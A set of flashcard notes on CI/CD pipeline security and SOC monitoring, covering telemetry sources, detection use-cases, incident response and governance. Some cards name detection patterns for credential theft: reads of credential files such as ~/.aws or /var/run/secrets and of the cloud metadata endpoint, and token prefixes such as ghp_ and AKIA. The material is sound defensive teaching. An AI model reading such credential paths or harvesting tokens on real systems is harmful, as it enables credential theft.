notes.front: Why should the platform team and the Security Operations Center (SOC) co-own pipeline detections?
notes.back: The platform team knows what is normal and can fix root causes; the SOC knows attacker behaviour and runs 24/7 triage. Either alone produces rules that are wrong or ignored.

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.front: Which four log families does a pipeline monitoring programme need at minimum?
notes.back: Source-control audit logs, CI/CD job and system logs, artifact registry logs, and the deploy target's audit logs (cloud and Kubernetes).
notes.extra: Fifth, when available: runtime telemetry from the runners themselves (process, file, network).

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.front: What does a source-control audit log (GitHub/GitLab audit events) record that the Git history does not?
notes.back: Settings changes, token creation, membership changes, repository visibility, deploy keys, webhooks, and who read or cloned what. Git history only shows commits.
notes.analogy: The building's visitor log shows who was given keys; the whiteboard only shows what got written.

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.front: Why must audit logs be exported out of the CI/SCM platform rather than viewed in its UI?
notes.back: Retention is short, search is weak, and an attacker with admin rights can delete them. The SIEM copy is longer-lived and outside the attacker's control.
notes.analogy: The camera footage goes to an off-site vault, not to the room being robbed.

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.front: What fields make a CI job event useful for detection?
notes.back: Actor, trigger (push, pull request, schedule, manual), repository and ref, workflow and job name, runner identity, secrets referenced, outcome, and start and end times.

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.front: What does the Kubernetes audit log show about a deploy that the CI log cannot?
notes.back: The actual API calls: which identity created or patched which object, from which IP, and whether it was admitted or denied. The CI log only shows what the job intended.
notes.extra: See also: Kubernetes deck for audit levels and apiserver flags.

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.front: Why should admission-controller denials be sent to the Security Operations Center (SOC)?
notes.back: A denied unsigned or privileged deployment is an attempted bypass. Prevention stopped it, but the attempt tells you something is wrong upstream.

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.front: What do registry logs contribute to detection?
notes.back: Pushes with actor and digest, pulls with identity and source IP, tag overwrites, and deletions. Together they show whether what is running was pushed by the pipeline.

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.front: Why correlate cloud audit logs (CloudTrail, Azure Activity, GCP Audit) with CI logs?
notes.back: They show which cloud role was assumed via OpenID Connect (OIDC) and what it did. A role assumption with no matching CI job is a stolen or forged token.

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.front: What is the detection value of secrets-manager access logs?
notes.back: Every secret read names the identity, time and secret. Reads from an unexpected job, outside working patterns, or in bulk, are strong compromise signals.

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.front: What does eBPF-based runtime telemetry (Tetragon, Falco) on runners add that logs cannot?
notes.back: What the job's processes actually did: files opened, processes spawned, connections made. Build logs show only what the script chose to print.

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.front: Why is a common identity key across log sources essential for pipeline detections?
notes.back: To join a workflow run to its cloud role session, registry push and cluster audit entry. Without a shared run ID or OpenID Connect (OIDC) subject, correlation is guesswork.
notes.analogy: A parcel tracking number that follows the box from depot to van to doorstep.
notes.extra: Practice: propagate the run ID into image labels, commit trailers and session names.

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.front: What is log integrity for pipeline telemetry, and how is it achieved?
notes.back: Logs cannot be altered after the fact. Use write-once or append-only storage, a separate account the platform admins cannot write to, and hashing or signing of batches.

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.front: What is Network Flow data from the runner subnet used for?
notes.back: Baselining normal destinations (registries, mirrors, APIs) and alerting on new ones. It is cheap, complete and hard for a job to tamper with.

notes.deck: Pipeline Security & SOC Monitoring::08 Telemetry Sources
notes.text: Telemetry maturity for pipelines: level 1 collects {{c1::job outcomes and audit logs}}; level 2 adds {{c2::identity correlation across CI, cloud and cluster}}; level 3 adds {{c3::runtime process and network telemetry from runners}}.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: branch protection disabled or weakened. Why high-fidelity, and what is the playbook?
notes.back: Legitimate changes are rare and planned, so almost every hit is real. Playbook: confirm with change record; if none, restore protection, review commits since, and suspend the actor.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: workflow or pipeline definition changed by someone outside the platform team. What should the rule check?
notes.back: A change to .github/workflows/, .gitlab-ci.yml or Jenkinsfile where the author is not in the owning group, or where the change adds a new secret reference or external URL.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: force-push or history rewrite on a protected branch. What does it usually mean?
notes.back: Either someone hid a mistake (a committed secret) or an attacker removed evidence. Both need review: compare the old and new history and check for secrets in the removed commits.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: new personal access token or deploy key created with write scope. Why alert on creation rather than use?
notes.back: Creation is the persistence step; use may come weeks later. Catching it at creation lets you revoke before the attacker needs it.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: repository made public or a new outside collaborator added. What is the risk?
notes.back: Immediate exposure of history, including any secret ever committed, and (with a self-hosted runner) remote code execution for strangers.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: pipeline run triggered from a fork with secrets available. What is being detected?
notes.back: A privileged trigger (pull_request_target or equivalent) executing on untrusted code: the precondition for a pwn request.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: high-entropy string in build logs. What is the logic and the false-positive source?
notes.back: Scan logs for token-shaped strings (prefixes like ghp_, AKIA, long base64). False positives: hashes, digests, signatures; filter known formats.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: runner connects to a never-seen external destination. How is "never seen" defined?
notes.back: Not in the allow-list and not observed in the last N days for that pipeline. Dynamic baselines per pipeline cut noise from legitimate new mirrors.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: job reads cloud metadata endpoint or credential files (~/.aws, ~/.docker/config.json, /var/run/secrets). Why is it reliable on runners?
notes.back: Build steps rarely need those paths; a package's install script or test touching them is almost always theft. Runtime telemetry (eBPF) sees it even if the script hides it.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: new dependency from an unknown maintainer or published in the last days. What is the signal and why?
notes.back: Freshly published packages, or ones whose maintainer just changed, are the typical vehicle for typosquatting and hijacks. Flag them for review before the lockfile change merges.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: third-party action or plugin changed from SHA pin to a mutable tag. Why is this a detection, not just a lint?
notes.back: Loosening a pin is a prerequisite for a future tag-hijack attack. Catching it in review or in the audit stream prevents a whole attack class.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: pipeline run outside the pipeline's historical hours or from a new actor. How to tune it?
notes.back: Baseline per repository: actors, trigger types, time-of-day. Alert on a first-seen actor with a manual trigger, and lower severity for scheduled runs.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: secrets accessed in bulk by one job. What distinguishes it from normal?
notes.back: A deploy job reads the two or three secrets it needs. A job enumerating many secrets, or reading ones no step references, is dumping the store.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: new self-hosted runner registered. What should the analyst verify?
notes.back: That it matches a change request, that its network location is the runner subnet, and that its labels do not let it pick up trusted deploy jobs.

notes.deck: Pipeline Security & SOC Monitoring::09 Detection Use-Cases: Source & Build
notes.front: Use-case: signed-commit policy violation: unsigned commits appear on main. What does it indicate?
notes.back: Either branch protection failed, an administrator bypassed it, or a tool pushed with an unmanaged identity. All three are findings.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: Use-case: image running in production whose digest was never pushed by the pipeline. How is it built?
notes.back: Join cluster audit (image digests created) against registry logs (digests pushed by the build identity). Anything unmatched was deployed outside the pipeline.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: Use-case: admission denial for unsigned or unverified image. Why is one denial worth an alert?
notes.back: It means something tried to deploy an image the pipeline did not sign: a misconfiguration, a bypass attempt, or an attacker with cluster access.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: Use-case: cloud role assumed via OpenID Connect (OIDC) with no matching CI run. What does it reveal?
notes.back: A forged or replayed token, or a trust policy loose enough for another repository to assume the role. Correlate the session name or subject claim with the run ID.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: Use-case: deploy credential used from an IP outside the runner range. Why is it near-certain compromise?
notes.back: Pipeline identities only act from runners. A kubeconfig or cloud session used from a laptop or a foreign address means the credential was exfiltrated.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: Use-case: manual kubectl change in a GitOps-managed namespace. What is the detection source?
notes.back: Kubernetes audit log: a write by a human user or non-GitOps ServiceAccount to objects the GitOps controller owns. Drift reports from the controller are a second source.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: Use-case: privileged or host-mounted pod created by the deploy identity. Why alert even if admitted?
notes.back: A deploy identity normally creates ordinary workloads. A privileged pod, hostPath or hostNetwork from it suggests the pipeline was weaponised for a node escape.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: Use-case: production deploy outside an approved change window without a linked ticket. How to avoid noise?
notes.back: Emit the change or incident ID from the pipeline into the deploy annotation; the rule fires only when the annotation is missing or does not resolve.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: Use-case: environment protection bypassed (approval skipped, break-glass used). Who should be notified?
notes.back: The Security Operations Center (SOC) and the environment owner immediately, with the actor, reason and artifacts involved, for same-day review.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: Use-case: registry tag overwritten or image deleted. What do each of these indicate?
notes.back: Overwrite: possible substitution of a released image. Deletion: anti-forensics or ransom-style destruction. Both should be impossible with immutability and are alerts if they occur.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: Use-case: container in production spawns a shell or package manager. Why is this stronger for pipeline-built images?
notes.back: Pipeline images are minimal and known; a shell or apt running inside one has no legitimate reason. Runtime rules can be strict because the baseline is strict.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: Use-case: Software Bill of Materials (SBOM) query hits a newly disclosed vulnerable component. Is this a detection?
notes.back: Yes, an exposure detection: it tells the Security Operations Center (SOC) which running digests contain the component so response can prioritise patching and watch those workloads.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: Use-case: GitOps controller credentials or repository changed. Why is this the highest-impact deploy-side alert?
notes.back: The controller applies whatever its source repository says. Repointing it, or stealing its token, gives control over every namespace it manages.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: Use-case: provenance attestation missing or failing verification on a deployed artifact. What is the first triage question?
notes.back: "Was it built by the expected builder from the expected repository?" If not, isolate the workload and trace the digest back through registry logs.

notes.deck: Pipeline Security & SOC Monitoring::10 Detection Use-Cases: Deploy & Runtime
notes.front: How should detection use-cases be prioritised across the deploy stage?
notes.back: By blast radius: controller and registry integrity first, then credential misuse, then individual workload anomalies. The first two compromise everything downstream.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: First triage question for any pipeline alert?
notes.back: "Is there an approved change that explains this?" Most true positives are unregistered changes; most false positives are registered ones the rule could not see.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: What is the containment order when a CI credential is confirmed leaked?
notes.back: Revoke the credential, then pause the pipelines that used it, then rotate dependent secrets, then search logs for its use since the leak time.
notes.analogy: Cancel the stolen card before you review the statement.
notes.extra: Why this order: revoke first so the attacker's window closes while you investigate.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: Why pause the pipeline rather than delete the suspicious job during an incident?
notes.back: Pausing stops further damage while preserving logs, caches and the runner state for forensics. Deleting destroys evidence you need to size the compromise.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: What does scoping a build compromise require?
notes.back: The list of artifacts built on the compromised runner or with the compromised credential since the earliest suspicious event, found via provenance and registry logs.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: How does provenance speed up recovery after a build compromise?
notes.back: Every artifact's attestation names its builder and run. Filter by the compromised builder and you have the recall list; rebuild those from clean source on a clean builder.
notes.analogy: A batch number on every tin tells the factory exactly which products to recall.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: What is the "assume the runner is lost" rule?
notes.back: Once malicious code ran on a persistent runner, you cannot trust anything on it. Destroy and rebuild it from the hardened image; do not clean it in place.
notes.analogy: A kitchen with a confirmed rat infestation is gutted, not wiped down.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: Which evidence should be captured from a runner before it is destroyed?
notes.back: Job logs, the workspace and caches, process and network telemetry for the window, environment variables (minus values), and any tokens' identifiers for revocation.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: After a malicious commit is found, why rotate secrets even if the workflow never printed them?
notes.back: The job had them in its environment; exfiltration via an encoded DNS query or a dependency's network call leaves no log line. Assume exposure.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: What is a playbook for a detection use-case, and what must it contain?
notes.back: The steps an analyst follows when the rule fires: enrichment queries, decision points, containment actions with required approvals, and who to notify.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: Which pipeline containment actions are safe to automate with Security Orchestration, Automation and Response (SOAR), and which need a human?
notes.back: Automate: revoke a token, pause a repository's workflows, block a runner's egress. Human: rolling back production, deleting artifacts, suspending user accounts.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: Why should the SOC be able to pause a pipeline without the platform team?
notes.back: Attacks happen at 03:00; waiting for an owner extends the window. A pre-authorised, logged pause action is low-risk and reversible.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: What is the downstream notification duty after a confirmed supply-chain compromise?
notes.back: Consumers of affected artifacts (internal teams, customers) must be told which digests to stop trusting, with the clean replacement. Silence turns your incident into theirs.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: What belongs in the postmortem of a pipeline incident beyond the timeline?
notes.back: Which detection fired (or should have), mean time to detect (MTTD) and respond (MTTR), the control that failed, and the new use-case or hardening added. Each incident should retire one blind spot.

notes.deck: Pipeline Security & SOC Monitoring::11 Triage, Response & Recovery
notes.front: True positive vs benign true positive in pipeline alerts: what is the distinction?
notes.back: True positive: malicious activity. Benign true positive: the rule fired correctly on an action that was legitimate but unregistered. The second improves process, not rules.

notes.deck: Pipeline Security & SOC Monitoring::12 Maturity & Governance
notes.front: What does the NIST Secure Software Development Framework (SSDF) cover that Supply-chain Levels for Software Artifacts (SLSA) does not?
notes.back: The whole development practice: organisation, people, protecting software and responding to vulnerabilities. SLSA is narrower: the integrity of build and provenance.

notes.deck: Pipeline Security & SOC Monitoring::12 Maturity & Governance
notes.front: What is the CIS Software Supply Chain Security Guide useful for?
notes.back: A checklist of concrete controls by stage (source, build, dependencies, artifacts, deploy) that can be turned into both hardening backlog items and audit questions.

notes.deck: Pipeline Security & SOC Monitoring::12 Maturity & Governance
notes.front: Why do regulations such as the EU Cyber Resilience Act make pipeline provenance a compliance topic?
notes.back: They require vendors to know and attest what is in their product and to report exploited vulnerabilities fast. Provenance and Software Bills of Materials (SBOMs) are how you answer.

notes.deck: Pipeline Security & SOC Monitoring::12 Maturity & Governance
notes.front: How is detection coverage for pipelines measured?
notes.back: Map each pipeline stage and MITRE ATT&CK technique to the use-cases that detect it; coverage is the share with a tested, tuned rule and the telemetry it needs.

notes.deck: Pipeline Security & SOC Monitoring::12 Maturity & Governance
notes.front: What is a purple-team exercise for a pipeline, and why run one?
notes.back: Red simulates attacks (poisoned pull request, stolen token, runner egress) while blue watches which alerts fire. It proves rules work end-to-end on real telemetry.

notes.deck: Pipeline Security & SOC Monitoring::12 Maturity & Governance
notes.front: Why run attack simulations in the real pipeline rather than in a lab?
notes.back: The gaps are in the real configuration: a forgotten repository, an admin exemption, a log source not shipped. A lab reproduces the design, not the drift.

notes.deck: Pipeline Security & SOC Monitoring::12 Maturity & Governance
notes.front: What is a pipeline inventory, and why is it the first governance step?
notes.back: The list of every repository, pipeline, runner, registry and deploy target with its owner. You cannot protect or monitor what nobody knows exists.
notes.analogy: You cannot lock doors you don't know are there.

notes.deck: Pipeline Security & SOC Monitoring::12 Maturity & Governance
notes.front: Golden path pipeline: how does it help security scale?
notes.back: Teams use a platform-maintained, pre-hardened template (SHA-pinned actions, OpenID Connect (OIDC) auth, signing, scans). Security fixes propagate by updating one template.
notes.analogy: One well-maintained highway beats a hundred private dirt roads: fix a pothole once.

notes.deck: Pipeline Security & SOC Monitoring::12 Maturity & Governance
notes.front: What key performance indicators show pipeline-security maturity, beyond alert counts?
notes.back: Share of pipelines on the golden path, share using short-lived credentials, share of production images with verified provenance, and mean time to detect (MTTD) and respond (MTTR) on exercises.

notes.deck: Pipeline Security & SOC Monitoring::12 Maturity & Governance
notes.text: Maturity ladder: level 1 = {{c1::visibility}} (inventory, audit logs exported); level 2 = {{c2::hardening}} (branch protection, OpenID Connect (OIDC), pinning, signing); level 3 = {{c3::detection and response}} (use-cases, playbooks, exercises); level 4 = {{c4::verification}} (admission enforcement, provenance, reproducibility).

notes.deck: Pipeline Security & SOC Monitoring::12 Maturity & Governance
notes.front: Why should exceptions (unpinned action, static secret, admin bypass) be time-boxed and tracked?
notes.back: Permanent exceptions become the attacker's path of least resistance. A registry with expiry dates forces re-justification and keeps the inventory honest.

notes.deck: Pipeline Security & SOC Monitoring::12 Maturity & Governance
notes.front: What is the two-person rule applied to pipelines, and where must it hold?
notes.back: No single identity can change code, pipeline definition and production alone. It must hold for merges to main, workflow changes, and production deploy approvals.
notes.analogy: Launch keys that need two officers turning at once.

notes.deck: Pipeline Security & SOC Monitoring::12 Maturity & Governance
notes.front: How should a Security Operations Center (SOC) handle the AI coding agent era in pipelines?
notes.back: Agents open pull requests and run tools with tokens like any contributor. Treat them as untrusted automation: scoped tokens, no trusted-stage access, and review of what they change.
